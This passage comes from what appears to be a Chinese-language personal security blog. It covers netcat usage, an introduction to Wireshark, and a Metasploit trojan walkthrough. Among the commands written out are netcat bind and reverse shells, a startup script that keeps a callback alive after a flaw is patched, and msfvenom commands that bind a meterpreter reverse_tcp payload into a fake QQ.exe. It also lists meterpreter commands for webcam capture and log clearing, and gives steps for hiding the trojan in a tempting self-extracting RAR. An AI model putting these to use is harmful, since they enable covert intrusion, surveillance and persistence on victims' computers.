<li>nc -nv 1.1.1.1 4444（客户端）</li>
<li><img src="https://kite-007.github.io/post-images/1617676711717.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617676721513.png" alt="" loading="lazy"></li>
<li>首先服务端使用nc打开主机上面一个侦听端口，然后客户端也使用nc通过IP和这个打开的端口去连接这个服务器，连接之后输入文本信息，服务端可以接收到。</li>
</ul>
<hr>
<ul>
<li>netstat -pantu | grep 4444</li>
<li><img src="https://kite-007.github.io/post-images/1617676981719.png" alt="" loading="lazy"></li>
<li>这个命令可以用来查看服务端要打开的端口是否开放着。</li>
<li>连接在一端终止，两端都会终止。</li>
</ul>
<hr>
</li>
<li>聊天和渗透测试有什么关系。
<ul>
<li>用文本信息来传输，在电子取证这里有一个典型的应用场景。</li>
<li>电子取证的原则：取证的过程中，尽量少的或者完全不会对取证的目标机的计算文件里面的内容做出改变。如果做出了改变，就有可能改变了硬盘扇区，造成原来硬盘上面已经被删除的内容无法被恢复的情况。
<ul>
<li>eg：
<ul>
<li><img src="https://kite-007.github.io/post-images/1617677885076.png" alt="" loading="lazy"></li>
<li>主机先打开一个端口。</li>
</ul>
<hr>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617678033080.png" alt="" loading="lazy"></li>
<li>利用管道命令发送要取证的内容。</li>
</ul>
<hr>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617678082063.png" alt="" loading="lazy"></li>
<li>收到取证信息。</li>
</ul>
<hr>
<ul>
<li>如果收取到的信息比较多的话，可以将他先保存到一个文件里面，只需在服务端的指令稍加修改就可以。</li>
<li>nc -l -p 4444 &gt; nc.txt</li>
</ul>
<hr>
<ul>
<li>查看进程中是否存在可疑的信息。</li>
<li><img src="https://kite-007.github.io/post-images/1617678571781.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617678614587.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ul>
<li>ps aux | nc -nv 192.168.200.147 4444 -q 1</li>
<li>-q：标准的结果输出完成之后，等待几秒钟之后自动退出，如果不加这个命令，就无法判断当前的信息是否发送完成，nc会一直处于连接状态，如果加了-q的命令，nc传输完成之后就会自动断开连接。</li>
</ul>
<hr>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="3-传输文件目录">3. 传输文件，目录</h2>
<ol>
<li>传输文件
<ul>
<li>A作为接收端，先打开端口(接收端或者发送端都可以)，A先打开一个端口指定，将接收的文件保存到1.MP4，B发送端连接端口，用小于号将要传送的文件输入到nc连接远端的端口。</li>
<li>原理：端口的重定向。</li>
<li>在发送端使用-q才会断开连接。</li>
</ul>
</li>
</ol>
<pre><code>A：nc -lp 333 &gt; 1.mp4
B：nc -nv 1.1.1.1 333 &lt; 1.mp4 –q 1
• 或
A：nc -q 1 -lp 333 &lt; a.mp4
B： nc -nv 1.1.1.1 333 &gt; 2.mp4
</code></pre>
<hr>
<ul>
<li>方式一：A做接收端
<ul>
<li><img src="https://kite-007.github.io/post-images/1617782905823.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617782911820.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617782917888.png" alt="" loading="lazy"></li>
<li>先将ps.txt在A上面删去，再在B上面将ps.txt传送到A上面去，形象一点，A只要接收到内容，就会将该内容保存到一个文件，或者可以说发送端一旦连接A，只要发送了内容，就会在A端生成一个文件，无论接收到的是什么。</li>
<li>第一种方式下在后端加上-q 1发送完毕之后会自动断开连接</li>
</ul>
</li>
</ul>
<hr>
<ul>
<li>方式二：A做发送端
<ul>
<li><img src="https://kite-007.github.io/post-images/1617782702401.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617782707036.png" alt="" loading="lazy"></li>
<li>A要发送ps.txt，B接收ps.txt，形象一点，就是将ps.txt放入该A的连接端口，只要谁来连接端口，那麽这个文件就会从这个端口流入到对方的电脑，并输出。</li>
<li>第二种方式下在后端加上-q 1发送完毕之后不会断开连接</li>
</ul>
</li>
</ul>
<hr>
<ol start="2">
<li>传输目录
<ul>
<li>传输目录其实并不是nc本身的功能，他还需要配合其他的命令使用。</li>
<li>在A上创建一个目录ps，将ps.txt放入该目录传送到B端。</li>
<li>思路：先将该要发送的文件目录打包，之后打包成一个文件，文件通过管道把他发送到nc的一个端口里面，之后在目录的接收端先用nc连接发送端打开的端口，连接之后打包好的目录就流到了接收端，在接收端再通过管道，把接收到的打包文件进行解包，重新还原成目录进行传输。</li>
<li>传输时也涉及到正向反向，就是文件传输的两种方式，以下使用一种方式。</li>
</ul>
</li>
</ol>
<pre><code>A：tar -cvf - ps/ | nc -lp 333 –q 1
B：nc -nv 1.1.1.1 333 | tar -xvf - ps
</code></pre>
<hr>
<ul>
<li>演示：
<ul>
<li><img src="https://kite-007.github.io/post-images/1617791140944.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617791145577.png" alt="" loading="lazy"></li>
<li>B端接收到了文件，连接自动断开，注意空格和横线。</li>
<li>A端先进行打包，再通过管道进行传送，B端接收到打包文件进行解包，得到还原的目录文件，也可以使用传送文件的方式进行传输。</li>
</ul>
</li>
</ul>
<hr>
<h2 id="4-加密传输文件">4. 加密传输文件</h2>
<ul>
<li>思路与传送目录的思路相似。</li>
<li>也是通过加密指令，把一个文件先进行加密，生成一个加密文件，再把这个加密文件作为输入结果输入到nc的命令里面去，之后再由nc的命令实现双方的传递。</li>
<li>加密传文件与传输目录的顺序(方向)有所发生变化。在接收端A端，先nc侦听一个端口，端口等待传入文件，当B把文件进行加密并与A建立连接传入文件之后，A把端口传入的文件作为下一个命令的输入，也就是接收后传入到解密命令中去，解密之后再把文件输出出来。</li>
</ul>
<pre><code>A：nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4
B： mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1
</code></pre>
<ul>
<li>mcrypt：加解密操作，KALI默认没有安装。</li>
<li>-Fbqd：解密，需要密码。</li>
<li>-Fdq：加密，需要密码。</li>
<li>rijndael-256：加解密算法，256的密钥，解密完成之后密钥就会被flush掉，不会在本地进行保存。</li>
</ul>
<hr>
<ul>
<li>演示：
<ul>
<li><img src="https://kite-007.github.io/post-images/1617884704863.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617884712348.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617884719247.png" alt="" loading="lazy"></li>
<li>A端先打开端口，确认是否输入正确，之后等待。</li>
<li>B端传入文件回车之后需要输入两次密码，输入密码之后，退出链接。</li>
<li>A端出现提示输入密码的信息，输入正确密码之后，接收到文件退出链接。</li>
</ul>
</li>
</ul>
<h2 id="5-流媒体服务器">5. 流媒体服务器</h2>
<ul>
<li>nc可以作为流媒体服务器，先需要一个流媒体的服务器端，之后再有一个流媒体的客户端。</li>
<li>服务器端为A，客户端为B。</li>
<li>cat 用来查看文本也可以用来查看文件，cat之后输出，作为下一个命令的输入，nc侦听端口，之后将MP4的文件输入到333端口里面去。</li>
<li>B端连接流媒体服务器A，B端一旦和A端建立连接之后，那麽从A端333端口流入的文件就会流入B端，之后B端就会把接收到的视频流通过管道输出给媒体播放器，让媒体播放器去播放内容。</li>
<li>mplayer KALI默认没有安装，指定了缓存大小。</li>
</ul>
<pre><code>A： cat 1.mp4 | nc -lp 333 
B： nc -nv 1.1.1.1 333 | mplayer -vo x11 -cache 3000 -
</code></pre>
<hr>
<h2 id="6-端口扫描">6. 端口扫描</h2>
<ul>
<li>nc以客户端的形式来作为一个扫描器，默认情况下nc以tcp协议进行探测，也是探测1-65535的tcp端口是否开放，因为默认是tcp，假如现在要探测udp呢？就在这之后加参数-u。</li>
<li>-z：扫描模式，探测相应的端口，不会做后续的io的输入输出交换。</li>
</ul>
<pre><code>nc -nvz 1.1.1.1 1-65535 
nc -vnzu 1.1.1.1 1-1024
</code></pre>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617888793661.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617888800907.png" alt="" loading="lazy"></li>
</ul>
<hr>
<h2 id="7-远程克隆硬盘内存">7. 远程克隆硬盘，内存</h2>
<ul>
<li>远程电⼦取证的第一步，在进行电子取证之前需要现将目标的内存，硬盘做一个完整的备份，不仅仅只是把文件里的内容拷贝，还包括可以恢复的数据文件。可以将目标服务器硬盘远程复制。有了备份之后就可以进行破坏性分析。</li>
<li>内存中可能会用运行中的木马程序，僵尸程序等待，这些在服务器关机之后就会丢失。</li>
<li>硬盘的工作原理：通过磁头的指针，磁化磁盘表面上的每个扇区里面的每个数据位的磁头，正向表示为1反向表示为0，通过这种方式将0，1记录进去。当把一个文件存进去，就相当于磁头磁化了一部分扇区里的磁头的方向。</li>
<li>平常使用的话：对操作系统下达指令，要删除某个文件，操作系统不会让磁针把磁盘上面有关于这个文件的磁头全部初始化，他只会把文件名的第一个首字母标记，标记&quot;文件已经被删除了&quot;，文件目录列表里面不会出现，但是这个文件实际上的每一个块，每一个扇区，每一个磁道，每一个位，里面的数据基本上是完整的存在于磁盘里面的，所以有的删除的文件是可以进行还原的，如果新进来了文件，这些可以被还原的文件就可能被覆盖了，无法再被还原。</li>
</ul>
<pre><code>A： nc -lp 333 | dd of=/dev/sda 
B： dd if=/dev/sda | nc -nv 1.1.1.1 333 –q 1 
</code></pre>
<ul>
<li>B：作为被取证电脑，把硬盘作为一个输入结果管道输出给nc，nc连接接收端电脑ip，发送完成之后断开连接。</li>
<li>A：接收端，在A端挂载硬盘，通常不是sda。侦听端口，侦听从B端传出来的内容，管道给dd，输出到另外一块硬盘作为流的输出。</li>
<li>if：input file</li>
<li>of：output file</li>
</ul>
<hr>
<ul>
<li>这里需要做一个硬盘容量比较小的虚拟机进行尝试。</li>
</ul>
<hr>
<h2 id="8-远程控制">8. 远程控制</h2>
<ul>
<li>一台windows的服务器要实现远程控制，通常要打开远程控制，首先要打开3389端口，然后管理员可以在另外一个地方连到机房里打开的端口的服务器上，在对它进行远程控制远程管理，这样管理员就不用每天在机房里进行服务器的配置，效率比较高，方便。windows通常会使用一些远程管理的工具。linux通常是xshell，在一定程度上可以代替ssh。</li>
<li>类似于QQ的远程协助。</li>
</ul>
<pre><code>正向：
• A：nc -lp 333 -c bash
• B：nc -nv 1.1.1.1 333
B控制A

反向：
• A：nc -lp 333
• B：nc -nv 1.1.1.1 333 -c bash

# 注：Windows⽤户把bash改成cmd；
</code></pre>
<p>*正向：<br>
* <img src="https://kite-007.github.io/post-images/1617969110798.png" alt="" loading="lazy"><br>
* B获得了A的控制权，取得的是目前A所拥有的控制权。<br>
* 正向shell：A作为服务端，侦听一个端口，通过B作为客户端来连接这个端口，之后服务器A把自己的bash传给客户端。</p>
<hr>
<ul>
<li>反向：
<ul>
<li><img src="https://kite-007.github.io/post-images/1617970718384.png" alt="" loading="lazy"></li>
</ul>
</li>
</ul>
<hr>
<ul>
<li>比如现在A有一个漏洞，B通过A的这个漏洞短暂地拿到了这个服务器的shell，如果这个漏洞近期就要被修复了，那么就不能够在利用这个漏洞进入服务器A并拿取shell。这时就可以通过nc在两台主机保持连接，继续实现远程控制，即使所有的漏洞已经被修复了。甚至可以把nc写成一个启动脚本，放入etc/目录下的init.b的目录下，运行系统启动时的配置命令，update -rc.d，把nc写成的这个脚本当作一个系统服务，每次A重启之后他就会自动地去侦听B的端口。（条件：被攻击的服务器的端口与攻击者的端口可以相互远程连接，条件比较苛刻，因为一般的服务器只会打开特定的端口，而从外部向内部进行访问不经过这些特定的端口则都会被禁止掉，这时，就可以试试反向连接）</li>
<li>在攻击端侦听一个端口，在被攻击端的服务器上面通过启动脚本，每一次重启的时候，被攻击端的服务器会主动的连接攻击者的IP地址，主动地送上shell，比较容易实现。因为一般服务器不会禁止掉从内向外发送的请求，另外一些的可能性也存在。</li>
</ul>
<hr>
<h2 id="9-加密所有流量">9. 加密所有流量</h2>
<ul>
<li>nc缺点：没有流量加密，容易被嗅探，ARP攻击等等。没有身份验证的能力，无法判断，无论谁都能链接这个打开了的端口。</li>
<li>Ncat可以弥补这些缺点，Ncat包含于nmap工具包中。</li>
</ul>
<pre><code>• Nc缺乏加密和⾝份验证的能⼒
• Ncat包含于nmap⼯具包中
• A：ncat ncat -c bash --allow 192.168.20.14 -vnl 333 --ssl 
• B：ncat -nv 1.1.1.1 333 --ssl

--allow：允许哪个ip地址来连接
--ssl：管道是加密方式的链接
-vnl：指定端口
</code></pre>
<hr>
<ul>
<li>管道加密演示：
<ul>
<li><img src="https://kite-007.github.io/post-images/1617973437553.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617973823381.png" alt="" loading="lazy"></li>
<li>两个通过ncat命令链接，在管道中传输的文件也会被加密。</li>
<li>ncat可以完成nc的所有功能。</li>
</ul>
</li>
</ul>
<hr>
<h1 id="wireshark">WIRESHARK</h1>
<h2 id="介绍">介绍</h2>
<ol>
<li>主要功能为抓包嗅探和协议分析，必备工具。</li>
</ol>
<ul>
<li>在一台主机传输流量到另一台主机上面，可以用此将传输的数据流量包抓取下来，之后提取所有内容信息，抓取下来的包可以对其里面的内容进行分析，也可以保存下来，用于日后的进一步分析或者用于还原当时的网络情景。<br>
<br></li>
</ul>
<ol start="2">
<li>wireshark本来的主要功能是用于对数据包做流量分析，其抓包的功能本来不属于其本身，使用的是抓包引擎：(用这个组件进行抓取流量包之后，其会将数据流量包传递给wireshark)</li>
</ol>
<ul>
<li>Libpcap9——Linux</li>
<li>Winpcap10——Windows<br>
<br></li>
</ul>
<ol start="3">
<li>wireshark里面存在解码定义，是目前所有抓包软件中最优秀的一个，通过解码定义能够对抓取上来的数据流量包(0101···)进行解码分析。</li>
</ol>
<h2 id="启动试着抓取">启动试着抓取</h2>
<pre><code>#启动
wireshark
</code></pre>
<ol>
<li>启动之后首先要选择一个抓包的网卡</li>
</ol>
<ul>
<li>笔记本一般会有以太网网卡，有线网卡，无线网卡。服务器一般会有多个网卡。这里要指定抓取哪个网卡上面的数据包，这里选择以太网网卡eth0。</li>
<li><img src="https://kite-007.github.io/post-images/1617603171642.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ul>
<li>其他机器里的广播流量包或者一些其他的单通数据包(混杂模式)经过kali机器，那麽流量包就会被抓取下来。</li>
<li><img src="https://kite-007.github.io/post-images/1617603200042.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ul>
<li>设置过滤器，开启混杂模式时一定得过滤掉不需要的，这里可以进行选择，选择之后在方框中可以进行修改，像抓取单个机器，只抓arp包，只抓ip包，抓取端口等等。</li>
<li><img src="https://kite-007.github.io/post-images/1617603302214.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ul>
<li>抓取我打开的一台机器192.168.200.142的包</li>
<li><img src="https://kite-007.github.io/post-images/1617545465580.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ul>
<li>抓取的包可以进行保存，保存的文件类型也可以另存为可以兼容其他工具的类型，通常pcap兼容性比较好，有gzip选项可以进行压缩。</li>
<li><img src="https://kite-007.github.io/post-images/1617603431690.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617603460056.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ul>
<li>首选项里可以更改界面字体等。</li>
<li><img src="https://kite-007.github.io/post-images/1617603573075.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617603593674.png" alt="" loading="lazy"><br>
<br></li>
</ul>
<h2 id="信息统计">信息统计</h2>
<ul>
<li>英文是Statistics（统计）里面可以查看统计信息，进一步收取信息来查看网络里当前的状态，发现安全问题。</li>
</ul>
<ol>
<li>Summary（捕获文件属性），文件属性，从中可以查看珠宝文件的摘要信息：时间，接口，抓取多少个包，报的情况如何等等。</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617602784055.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617602789019.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="2">
<li>Endpoins（），节点数，查看各种所抓取的协议的地址数量，也可以根据发送的数据包，接收到的数据包进行一个排序。</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617605458382.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617605466853.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617605485848.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="3">
<li>Protocol Hierarchy（协议分级统计），协议分布，可以查看各种重要的协议信息数据，了解到当前抓取的数据包的协议类型，都是什么样的数据包。</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617605302169.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617605334853.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="4">
<li>Packet Lengths（分组长度），包大小分布，查看网络里面是占比大包数据流量的多，还是小包数据流量的多，如果是以小包数据流量占比偏多的话，网络的性能可能会比较差，另外有许多的网络攻击就是以小包的形式来的。</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617606056570.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="5">
<li>Conversations（），会话连接，所表示的意思为会话，就是可以看出那两个机器之间产生了数据流量的交互。</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617606708094.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="6">
<li>解码方式</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617609881814.png" alt="" loading="lazy"></li>
<li>查看数据流量包在80端口按照HTTP解析下来，它的内容是否为HTTP的指令，如果不是就可以进行更改，右击单个数据流量包，选择Decode As...可以更改。</li>
<li><img src="https://kite-007.github.io/post-images/1617610200018.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="7">
<li>另外一个比较重要的是专家信息，在Analyze（分析）中，选择专家信息。</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617610719654.png" alt="" loading="lazy"></li>
<li>它是衡量一个抓包软件好与坏的一个重要的信息，专家信息如果功能丰富以及自动分析能力强的话，会给使用者带来巨大的便利。</li>
<li>比如，现在的网络有两个不同的MAC地址在发送ARP包，都在声称自己是网关的IP地址，如果这些包被wireshark抓取下来，进行分析就会得出网络里面网络里面正在发生着ARP欺骗，因为有两个不同的MAC地址正在发送着相同的网关IP，声称自己是相同的网关IP。</li>
<li>所以专家系统有时候会给我们一个提示，告诉我们网络中存在着哪些问题。</li>
</ul>
<hr>
<p>一般流程： 检查信息统计是比较重要的一个阶段，一般的流程则是先开启混杂模式抓取大量的数据包，之后设置筛选信息（统计信息先下手），看看哪个机器发送了大量的数据流量包，再看看哪些机器流量最大，一般发送了大量的包是有问题的，然后将这些有问题的数据流量来源地址筛选出来，再根据异常情况以及抓取的包的结果进行分析，大概是哪个方向导致了网络的一个不正常的情况，有了这个方向之后，再次进行各种筛选功能，把可能存在问题的包给筛选出来，再逐个分析报的内容，这样会比较快捷的，有方法，有方向的去发现网络中的问题。</p>
<h2 id="实践">实践</h2>
<p><strong>抓包对比NC，NCAT加密与不加密的流量</strong></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[# MSF木马使用(五)]]></title>
        <id>https://kite-007.github.io/msf-zhi-mu-ma-shi-yong-wu/</id>
        <link href="https://kite-007.github.io/msf-zhi-mu-ma-shi-yong-wu/">
        </link>
        <updated>2021-03-30T23:43:21.000Z</updated>
        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
<li><a href="#1-%E6%8D%86%E7%BB%91%E6%9C%A8%E9%A9%AC">1. 捆绑木马</a>
<ul>
<li><a href="#1-%E7%AE%80%E8%A6%81%E6%B5%81%E7%A8%8B">1. 简要流程</a></li>
<li><a href="#2-%E8%82%89%E9%B8%A1%E6%93%8D%E4%BD%9Cmeterpreter">2. 肉鸡操作(meterpreter)</a>
<ul>
<li><a href="#1-%E5%88%A9%E7%94%A8rar%E8%87%AA%E8%A7%A3%E5%8E%8B%E5%8E%9F%E7%90%86%E8%BF%90%E8%A1%8C%E6%9C%A8%E9%A9%AC">1. 利用RAR自解压原理运行木马</a></li>
<li><a href="#2-%E5%AF%B9rar%E6%9C%A8%E9%A9%AC%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8C%E4%BC%AA%E8%A3%85">2. 对RAR木马文件进行伪装</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#2-msf%E6%8F%90%E6%9D%83">2. MSF提权</a></li>
</ul>
(MSF木马使用)<br>
<em>msfvenom是msfpayload,msfencode的结合体，可利用msfvenom生成木马程序,并在目标机上执行,配合meterpreter在本地监听上线。</em></p>
<p>MSF木马使用指令：msfvenom，可以查看木马使用帮助</p>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617147958615.png" alt="" loading="lazy"></li>
</ul>
<p>MSF重要参数：</p>
<pre><code>-p payload设置
-e 编码设置
-a 系统结构，默认x86
-s payload最大大小
-i 编码次数
-f 生成文件格式
</code></pre>
<hr>
<p>木马OPTIONS：</p>
<table>
<thead>
<tr>
<th>选项卡1</th>
<th>选    项    卡   2</th>
<th>备注</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td>-l</td>
<td>--list</td>
<td>type&gt;</td>
<td>列出指定类型的所有模块 类型包括: payloads, encoders, nops, platforms, archs, formats, all</td>
</tr>
<tr>
<td>-p</td>
<td>--payload</td>
<td>payload&gt;</td>
<td>指定需要使用的payload(有效载荷)(--list payloads得到payload列表，--list-options得到指定payload的参数)，如果需要使用自定义的payload,请使用'-'或者stdin指定</td>
</tr>
<tr>
<td></td>
<td>--list-options</td>
<td></td>
<td>列出指定payload的标准,高级和规避选项  例如:msfvenom -p generic/shell_bind_tcp --list-options ，将列出shell_bind_tcp这个payload的各种选项信息</td>
</tr>
<tr>
<td>-f</td>
<td>--format</td>
<td>format&gt;</td>
<td>指定输出格式(使用 --list formats 列出所有的格式)</td>
</tr>
<tr>
<td>-e</td>
<td>--encoding</td>
<td>encoder&gt;</td>
<td>要使用的编码(使用 --list encoders 列出所有的编码) 用于编码加密</td>
</tr>
<tr>
<td></td>
<td>--smallest</td>
<td></td>
<td></td>
</tr>
<tr>
<td>-a</td>
<td>--arch</td>
<td>arch&gt;</td>
<td>指定payload的目标CPU架构(使用 --list archs 列出所有的CPU架构)</td>
</tr>
<tr>
<td></td>
<td>--platform</td>
<td>platform&gt;</td>
<td>指定payload的目标操作系统平台(使用 --list platforms 列出所有的操作系统平台)</td>
</tr>
<tr>
<td>-o</td>
<td>--out</td>
<td>path&gt;</td>
<td>将payload保存到文件中</td>
</tr>
<tr>
<td>-b</td>
<td>--bad-chars</td>
<td>list&gt;</td>
<td>指定不使用的字符集 例如:不使用'\x00\xff'这两个字符</td>
</tr>
<tr>
<td>-n</td>
<td>--nopsled</td>
<td>length&gt;</td>
<td>在payload上添加指定长度的nop指令</td>
</tr>
<tr>
<td>-s</td>
<td>--space</td>
<td>length&gt;</td>
<td>设定payload的最大长度    即生成的文件大小</td>
</tr>
<tr>
<td></td>
<td>--encoder-space</td>
<td>length&gt;</td>
<td>设定编码payload的最大长度(默认为-s的值)</td>
</tr>
<tr>
<td>-i</td>
<td>--iterations</td>
<td>count&gt;</td>
<td>对payload进行编码的次数</td>
</tr>
<tr>
<td>-c</td>
<td>--add-code</td>
<td>path&gt;</td>
<td>指定一个自己的win32 shellcode文件</td>
</tr>
<tr>
<td>-x</td>
<td>--template</td>
<td>path&gt;</td>
<td>指定一个可执行程序 将payload捆绑其中,例如:原先有个正常文件normal.exe 通过此选项把payload捆绑到这个程序上面</td>
</tr>
<tr>
<td>-k</td>
<td>--keep</td>
<td></td>
<td>针对-x中的捆绑程序 将创建新线程执行payload 一般情况-x -k选项一起使用</td>
</tr>
<tr>
<td>-v</td>
<td>--var-name</td>
<td>value&gt;</td>
<td>指定用于某些输出格式的自定义变量名称</td>
</tr>
<tr>
<td>-t</td>
<td>--timeout</td>
<td>second&gt;</td>
<td>从STDIN读取有效负载时等待的秒数(默认为30, 0为禁用)</td>
</tr>
<tr>
<td>-h</td>
<td>--help</td>
<td></td>
<td>查看帮助</td>
</tr>
</tbody>
</table>
<hr>
<ol>
<li>msfvenmo木马生成：</li>
</ol>
<ul>
<li>生成木马是由两个必要的参数-p以及-f</li>
<li>-p：用来指定所需要设置的payload</li>
</ul>
<pre><code class="language-shell">./msfvenom –l payloads      //查看所有msf可用的payload列表
</code></pre>
<ul>
<li>-f：用来指定payload的输出格式</li>
</ul>
<pre><code class="language-shell">./msfvenom -p windows/meterpreter/bind_tcp -f exe
./msfvenom --help –formats      //查看msf支持的输出格式
</code></pre>
<ul>
<li>msfvenom举例：</li>
</ul>
<pre><code class="language-shell">$./msfvenom -p windows/meterpreter/reverse_tcplhost=[Attacker IP]lport=4444 -f  exe -o /tmp/my_payload.exe
</code></pre>
<hr>
<p><strong>这里在win 7举例</strong></p>
<h1 id="1-捆绑木马">1. 捆绑木马</h1>
<h2 id="1-简要流程">1. 简要流程</h2>
<ol>
<li>生成木马</li>
</ol>
<pre><code class="language-shell"># 使用MSF生成木马，并与可执行文件进行捆绑
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.200.137 -f exe -x /home/ubuntu/PCQQ2021.exe -o /home/ubuntu/桌面/QQ.exe

-p：生成木马所使用的payload

windows/meterpreter/reverse_tcp：申明这是一个windows系统下的一个反弹tcp

还可以设置返回的端口，这里就不设置了，默认返回端口是4444

-f： 代表要捆绑的文件类型，这里是一个exe文件

-x：指定你要捆绑的文件的路径及文件名，这里我选择的是/home/ubuntu/里的PCQQ2020.exe

-o：指定生成的木马文件的路径及文件名，这里我把它保存在原路径里，名字就叫QQ.exe
</code></pre>
<ol start="2">
<li>在配置攻击模块之前，可以想办法把木马发送到目标及上面去</li>
<li>配置攻击模块，监听连入木马的目标机</li>
</ol>
<pre><code class="language-shell">#使用exploit/multi/handler监听连入的backdoor
use exploit/multi/handler

#设置对应的payload。
set payload windows/meterpreter/reverse_tcp

#显示所有的设置如果需要的话，可能还需要将LHOST，LPORT,设置成与payload中相同的地址和端口。
show options

set lhost 192.168.200.137
set lport 4444
run
</code></pre>
<ol start="4">
<li>这里直接将QQ.exe发送到目标机上面去，目标机双击运行之后，就中招了，可以看到我们拿到了meterpreter。</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617182926105.png" alt="" loading="lazy"></li>
</ul>
<h2 id="2-肉鸡操作meterpreter">2. 肉鸡操作(meterpreter)</h2>
<p>chcp 65001解决乱码问题</p>
<pre><code>ipconfig                #查看IP信息
shell                   #进一步获取权限
info                    #查看已有模块信息
getuid                  #查看权限
getpid                  #获取当前进程的pid
sysinfo                 #查看目标机系统信息
ps                      #查看当前活跃进程
kill &lt;PID值&gt;            #杀死进程
reboot / shutdown       #重启/关机shell #进入目标机cmd shell 
webcam_list             #查看摄像头
webcam_snap             #通过摄像头拍照
webcam_stream           #通过摄像头开启视频
execute                 #在目标机中执行文件execute -H -i -f 
cmd.exe                 #创建新进程cmd.exe，-H不可见，-i交互
migrate &lt;pid值&gt;         #将Meterpreter会话移植到指定pid值进程中
clearav                 #清除windows中的应用程序日志、系统日志、安全日志
enumdesktops            #查看可用的桌面
getdesktop              #获取当前meterpreter 关联的桌面
set_desktop             #设置meterpreter关联的桌面 -h查看帮助
screenshot              #截屏
use espia               #或者使用espia模块截屏 然后输入screengrab
run vnc                 #使用vnc远程桌面连接
</code></pre>
<p>这里虚拟机没有开启摄像头，所以截取了屏幕。<br>
<img src="https://kite-007.github.io/post-images/1617183284436.png" alt="" loading="lazy"></p>
<h3 id="1-利用rar自解压原理运行木马">1. 利用RAR自解压原理运行木马</h3>
<ul>
<li>如果对方就是不运行你所发送的捆绑木马文件，就可以利用RAR自解压的功能来达到目的。<br>
<img src="https://kite-007.github.io/post-images/1617187147948.png" alt="" loading="lazy"><br>
<img src="https://kite-007.github.io/post-images/1617187840287.png" alt="" loading="lazy"><br>
这里有两个文件，其中一个就是刚刚所生成的捆绑木马，一个是txt文档，另外又生成了一个木马文件。<br>
方法：</li>
</ul>
<ol>
<li>全部选中，鼠标右键添加到压缩文件</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617188798912.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="2">
<li>压缩文件的名字可以是充满诱惑性的，比如对方所想要的那个人的联系方式(只是名字)，注意这里的.exe并不是文件类型，后面会说他的用处。</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617188964866.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="3">
<li>在文件的高级选项中，有自解压选项，打勾确定，解压路径随便指定，最好是不能被对方发现。</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617189101373.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="4">
<li>在这里我想到了多种的组合方式，可以是捆绑后的.exe文件和一个正常的.txt文件，也可以是木马.exe文件和正常的.txt文件，还可以是正常的.exe文件和木马.exe文件，这就是上面所说创建了三个文件的原因。</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617189355892.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="5">
<li>在模式选项卡中设置解压时隐藏所有信息，之后确定完成创建。</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617189470051.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617189481034.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ol start="6">
<li>将此文件想办法发送到目标主机，之后设置监听反弹并run，等待木马运行连接。</li>
